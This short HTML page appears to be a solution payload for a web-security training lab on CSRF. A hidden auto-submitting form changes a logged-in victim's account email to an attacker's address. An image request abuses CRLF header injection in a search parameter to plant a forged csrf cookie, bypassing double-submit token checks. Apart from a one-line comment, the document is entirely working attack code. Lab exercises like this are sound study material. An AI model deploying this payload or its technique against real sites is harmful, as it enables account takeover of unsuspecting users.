<html>
    <body>
        <form action="https://0a79003203fe27dc804c08bf009e00d6.web-security-academy.net/my-account/change-email" method="POST" id="csrf-form">
        <input type="hidden" name="email" value="hackertube@tubeww.net">
        <input type="hidden" name="csrf" value="test">
    </form>
    
    <img src="https://0a79003203fe27dc804c08bf009e00d6.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=test%3b%20SameSite=None" onerror="document.forms[0].submit()">

    </body>
</html>
/*

find a injection point for csrf cookie

*/